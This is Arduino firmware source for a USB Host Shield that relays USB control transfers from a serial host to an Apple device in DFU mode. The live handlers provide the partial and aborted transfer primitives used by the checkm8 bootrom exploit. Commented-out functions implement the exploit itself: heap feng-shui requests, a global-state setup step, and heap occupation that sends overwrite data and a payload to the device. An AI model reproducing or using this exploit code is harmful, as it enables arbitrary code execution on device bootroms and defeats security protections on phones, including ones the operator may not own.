#include "User_Setup.h"
#include "Usb.h"
#include "checkm8_config.h"
#include "ard_protocol.h"
#include <avr/io.h>

USB Usb;
USB_DEVICE_DESCRIPTOR desc_buf;
uint8_t state, rcode, addr = 1;

//uint8_t io_buf[0x100];
//
//EpInfo *pep = NULL;
//uint16_t nak_limit = 0;
//uint8_t pktsize;
//uint16_t sz;
//const uint8_t *p;
//uint16_t part_sz;

struct serial_desc_args sd_args;
uint16_t serial_desc_buf[256];

struct usb_xfer_args usb_args;
uint8_t usb_data_buf[512];

int i;
char cmd;

//enum
//{
//    CHECKM8_INIT_RESET,
//    CHECKM8_HEAP_FENG_SHUI,
//    CHECKM8_SET_GLOBAL_STATE,
//    CHECKM8_HEAP_OCCUPATION,
//    CHECKM8_END
//};
//uint8_t checkm8_state = CHECKM8_INIT_RESET;
//
//
//void heap_feng_shui_req(uint8_t sz)
//{
//    rcode = Usb.ctrlReq_SETUP(addr, 0, 0x80, 6, 4, 3, 0x40a, sz);
//    Usb.regWr(rHCTL, bmRCVTOG1);
//    rcode = Usb.dispatchPkt(tokIN, 0, 0);
//}
//
//void heap_feng_shui()
//{
//    Serial.println("1. heap feng-shui");
//    heap_feng_shui_req(0xc0);
//    heap_feng_shui_req(0xc0);
//    for(int i = 0; i < 6; i++)
//        heap_feng_shui_req(0xc1);
//}
//
//void set_global_state()
//{
//    Serial.println("2. set global state");
//    rcode = Usb.ctrlReq_SETUP(addr, 0, 0x21, 1, 0, 0, 0, 0x800);
//    rcode = Usb.dispatchPkt(tokOUTHS, 0, 0);
//    rcode = Usb.ctrlReq(addr, 0, 0x21, 4, 0, 0, 0, 0, 0, NULL, NULL);
//}
//
//void heap_occupation()
//{
//    Serial.println("3. heap occupation");
//
//    heap_feng_shui_req(0xc1);
//    heap_feng_shui_req(0xc1);
//    heap_feng_shui_req(0xc1);
//
//    sz = sizeof(overwrite);
//    p = overwrite;
//    rcode = Usb.ctrlReq_SETUP(addr, 0, 0, 9, 0, 0, 0, sz);
//    Usb.regWr(rHCTL, bmSNDTOG0);
//    send_out(io_buf, 0);
//    while(sz)
//    {
//        pktsize = min(sz, 0x40);
//        for(int i = 0; i < pktsize; i++)
//            io_buf[i] = pgm_read_byte(&p[i]);
//        send_out(io_buf, pktsize);
//        if(rcode)
//        {
//            Serial.println("sending error");
//            checkm8_state = CHECKM8_END;
//            return;
//        }
//        sz -= pktsize;
//        p += pktsize;
//    }
//
//    sz = sizeof(payload);
//    p = payload;
//
//    while(sz)
//    {
//        part_sz = min(0x7ff, sz);
//        sz -= part_sz;
//        rcode = Usb.ctrlReq_SETUP(addr, 0, 0x21, 1, 0, 0, 0, part_sz);
//        Usb.regWr(rHCTL, bmSNDTOG0);
//        send_out(io_buf, 0);
//        while(part_sz)
//        {
//            pktsize = min(part_sz, 0x40);
//            for(int i = 0; i < pktsize; i++)
//                io_buf[i] = pgm_read_byte(&p[i]);
//            send_out(io_buf, pktsize);
//            if(rcode)
//            {
//                Serial.println("sending error");
//                checkm8_state = CHECKM8_END;
//                return;
//            }
//            part_sz -= pktsize;
//            p += pktsize;
//        }
//        Serial.print("Payload loading... ");
//        Serial.print(sizeof(payload) - sz);
//        Serial.print("/");
//        Serial.println(sizeof(payload));
//    }
//}

void recv_args(uint8_t *target, int len)
{
    for(i = 0; i < len; i = i + 1)
    {
        while(Serial.available() == 0);

        if(target == NULL) Serial.read();
        else target[i] = (uint8_t) Serial.read();
    }
}

uint8_t send_data(uint8_t *buf, uint8_t len)
{
    Usb.bytesWr(rSNDFIFO, len, buf);
    Usb.regWr(rSNDBC, len);
    Usb.regWr(rHXFR, tokOUT);
    while(!(Usb.regRd(rHIRQ) & bmHXFRDNIRQ));
    Usb.regWr(rHIRQ, bmHXFRDNIRQ);
    return (Usb.regRd(rHRSL) & 0x0f);
}

void setup()
{
    Serial.begin(ARDUINO_BAUD);
    while(Serial.available() > 0) Serial.read();

    if(Usb.Init() == -1) Serial.write(PROT_FAIL_INITUSB);
    else Serial.write(PROT_SUCCESS);
}

void loop()
{
    state = Usb.getUsbTaskState();
    while(state != USB_DETACHED_SUBSTATE_WAIT_FOR_DEVICE && state != USB_STATE_RUNNING)
    {
        Usb.Task();
        state = Usb.getUsbTaskState();
    }

    if(Serial.available() > 0)
    {
        cmd = (char) Serial.read();
        switch(cmd)
        {
            case PROT_PARTIAL_CTRL_XFER:
                recv_args((uint8_t *) &usb_args, sizeof(struct usb_xfer_args));
                Serial.write(PROT_ACK);

                rcode = Usb.ctrlReq_SETUP(addr, 0,
                                          usb_args.bmRequestType,
                                          usb_args.bRequest,
                                          usb_args.wValue & 0xFFu,
                                          (usb_args.wValue >> 8u) & 0xFFu,
                                          usb_args.wIndex,
                                          usb_args.data_len);
                if(rcode)
                {
                    Serial.write(PROT_FAIL_USB);
                    Serial.write(rcode);
                    break;
                }

                Usb.regWr(rHCTL, bmRCVTOG1);
                rcode = Usb.dispatchPkt(tokIN, 0, 0);
                if(rcode)
                {
                    Serial.write(PROT_FAIL_USB);
                    Serial.write(rcode);
                    break;
                }

                Serial.write(PROT_SUCCESS);
                break;

            case PROT_NO_ERROR_CTRL_XFER:
                recv_args((uint8_t *) &usb_args, sizeof(struct usb_xfer_args));
                Serial.write(PROT_ACK);

                rcode = Usb.ctrlReq_SETUP(addr, 0,
                                          usb_args.bmRequestType,
                                          usb_args.bRequest,
                                          usb_args.wValue & 0xFFu,
                                          (usb_args.wValue >> 8u) & 0xFFu,
                                          usb_args.wIndex,
                                          usb_args.data_len);
                rcode = Usb.dispatchPkt(tokOUTHS, 0, 0);
                Serial.write(PROT_SUCCESS);
                break;

            case PROT_NO_ERROR_CTRL_XFER_DATA:
                recv_args((uint8_t *) &usb_args, sizeof(struct usb_xfer_args));
                if(usb_args.data_len > sizeof(usb_data_buf))
                {
                    recv_args(NULL, usb_args.data_len);
                    Serial.write(PROT_ACK);
                    Serial.write(PROT_FAIL_TOOBIG);
                    break;
                }

                recv_args(usb_data_buf, usb_args.data_len);
                Serial.write(PROT_ACK);

                rcode = Usb.ctrlReq_SETUP(addr, 0,
                                          usb_args.bmRequestType,
                                          usb_args.bRequest,
                                          usb_args.wValue & 0xFFu,
                                          (usb_args.wValue >> 8u) & 0xFFu,
                                          usb_args.wIndex,
                                          usb_args.data_len);
                Usb.regWr(rHCTL, bmSNDTOG0);
                send_data(usb_data_buf, 0);
                send_data(usb_data_buf, usb_args.data_len);

                Serial.write(PROT_SUCCESS);
                break;

            case PROT_CTRL_XFER:
                recv_args((uint8_t *) &usb_args, sizeof(struct usb_xfer_args));
                if(usb_args.data_len > sizeof(usb_data_buf))
                {
                    // need to waste the data sent on the serial bus since the
                    // remote sends args and data consecutively and only checks
                    // for errors after receiving an ACK

                    recv_args(NULL, usb_args.data_len);
                    Serial.write(PROT_ACK);
                    Serial.write(PROT_FAIL_TOOBIG);
                    break;
                }

                recv_args(usb_data_buf, usb_args.data_len);
                Serial.write(PROT_ACK);

                rcode = Usb.ctrlReq(addr, 0,
                                    usb_args.bmRequestType,
                                    usb_args.bRequest,
                                    usb_args.wValue & 0xFFu,
                                    (usb_args.wValue >> 8u) & 0xFFu,
                                    usb_args.wIndex,
                                    usb_args.data_len, usb_args.data_len,
                                    usb_data_buf, NULL);
                if(rcode)
                {
                    Serial.write(PROT_FAIL_USB);
                    Serial.write(rcode);
                    break;
                }

                Serial.write(PROT_SUCCESS);
                break;

            case PROT_RESET:
                Serial.write(PROT_ACK);

                Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
                while((state = Usb.getUsbTaskState()) != USB_STATE_RUNNING) Usb.Task();

                Serial.write(PROT_SUCCESS);
                break;

            case PROT_SERIAL_DESC:
                recv_args((uint8_t *) &sd_args, sizeof(struct serial_desc_args));
                Serial.write(PROT_ACK);

                state = Usb.getUsbTaskState();
                if(state == USB_DETACHED_SUBSTATE_WAIT_FOR_DEVICE)
                {
                    Serial.write(PROT_FAIL_NODEV);
                    break;
                }

                Usb.getDevDescr(addr, 0, sizeof(USB_DEVICE_DESCRIPTOR), (uint8_t *) &desc_buf);
                if(desc_buf.idVendor != sd_args.dev_idVendor ||
                   desc_buf.idProduct != sd_args.dev_idProduct)
                {
                    Serial.write(PROT_FAIL_WRONGDEV);
                    break;
                }

                // multiplication by 2 is necessary here because iphone returns 16-bit characters
                Usb.getStrDescr(addr, 0, sd_args.len * 2, desc_buf.iSerialNumber, 0x0409, (uint8_t *) serial_desc_buf);
                Serial.write(PROT_SUCCESS);

                // not sure what the first byte is; skip it
                for(i = 1; i < sd_args.len + 1; i++)
                {
                    Serial.write(serial_desc_buf[i]);
                }
                break;

//            default:
//                Serial.write(PROT_FAIL_BADCMD);
//                break;
        }


//        Usb.getDevDescr(addr, 0, 0x12, (uint8_t * ) & desc_buf);
//        if(desc_buf.idVendor != 0x5ac || desc_buf.idProduct != 0x1227)
//        {
//            Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
//            if(checkm8_state != CHECKM8_END)
//            {
//                Serial.print("Non Apple DFU found (vendorId: ");
//                Serial.print(desc_buf.idVendor);
//                Serial.print(", productId: ");
//                Serial.print(desc_buf.idProduct);
//                Serial.println(")");
//                delay(5000);
//            }
//            return;
//        }
//        switch(checkm8_state)
//        {
//            case CHECKM8_INIT_RESET:
//                for(int i = 0; i < 3; i++)
//                {
//                    digitalWrite(6, HIGH);
//                    delay(500);
//                    digitalWrite(6, LOW);
//                    delay(500);
//                }
//                checkm8_state = CHECKM8_HEAP_FENG_SHUI;
//                Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
//                break;
//            case CHECKM8_HEAP_FENG_SHUI:
//                heap_feng_shui();
//                checkm8_state = CHECKM8_SET_GLOBAL_STATE;
//                Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
//                break;
//            case CHECKM8_SET_GLOBAL_STATE:
//                set_global_state();
//                checkm8_state = CHECKM8_HEAP_OCCUPATION;
//                while(Usb.getUsbTaskState() != USB_DETACHED_SUBSTATE_WAIT_FOR_DEVICE)
//                { Usb.Task(); }
//                break;
//            case CHECKM8_HEAP_OCCUPATION:
//                heap_occupation();
//                checkm8_state = CHECKM8_END;
//                Usb.setUsbTaskState(USB_ATTACHED_SUBSTATE_RESET_DEVICE);
//                break;
//            case CHECKM8_END:
//                digitalWrite(6, HIGH);
//                break;
//        }
    }
}